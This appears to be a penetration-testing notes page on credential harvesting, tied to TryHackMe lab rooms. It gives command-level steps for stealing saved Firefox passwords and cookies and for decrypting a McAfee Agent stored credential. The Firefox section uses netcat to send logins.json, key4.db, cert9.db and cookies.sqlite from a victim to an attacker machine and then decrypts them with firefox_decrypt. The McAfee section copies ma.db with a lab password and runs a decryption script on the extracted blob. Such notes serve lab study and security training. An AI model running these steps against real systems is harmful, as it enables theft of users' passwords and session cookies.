# Credential Harvesting

## Browsers

### **Firefox**

**Common Areas**

| Location                                                   | Notes                                                                                                                                                      | Example    |
| ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| C:\Users\\$USER\AppData\Roaming\Mozilla\Firefox\Profiles\\ | <p>Depending on the version of Firefox there will be a folder with the files you need.<br><strong>ex:</strong> ljfn812a.default-release = Firefox 75.0</p> | Gatekeeper |
|                                                            |                                                                                                                                                            |            |
|                                                            |                                                                                                                                                            |            |
|                                                            |                                                                                                                                                            |            |

**Exploit**

{% embed url="https://github.com/unode/firefox_decrypt" %}

#### Decrypt Credentials

**Examples**

[gatekeeper.md](../../walkthroughs/tryhackme/gatekeeper.md "mention")

**Kali**&#x20;

We need to transfer the following files one by one.

```
nc -nlvp 1234 > logins.json
nc -nlvp 1234 > key4.db 
nc -nlvp 1234 > cert9.db 
nc -nlvp 1234 > cookies.sqlite
```

**Victim**

```
nc64.exe -nv $KALI 1234 < logins.json
nc64.exe -nv $KALI 1234 < key4.db 
nc64.exe -nv $KALI 1234 < cert9.db 
nc64.exe -nv $KALI 1234 < cookies.sqlite
```

This will show any passwords saved in Firefox

**Kali**&#x20;

```
git clone https://github.com/unode/firefox_decrypt.git
python3.9 firefox_decrypt.py ./
```





## Configuration Files

### McAfee Agent

**Examples**

[#configuration-files](../../walkthroughs/tryhackme/breaching-active-directory.md#configuration-files "mention")

**Victim**

```
cd C:\ProgramData\McAfee\Agent\DB
```

**Victim**

```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
Password: Password1@
```

**Kali**

```
sqlitebrowser ma.db
```

**Kali**

```
cp /root/Rooms/BreachingAD/task7/mcafeesitelistpwddecryption.zip .
unzip mcafeesitelistpwddecryption.zip
```

<figure><img src="../../.gitbook/assets/image (4) (1) (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python2 mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py  jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

<figure><img src="../../.gitbook/assets/image (18) (7).png" alt=""><figcaption></figcaption></figure>

a

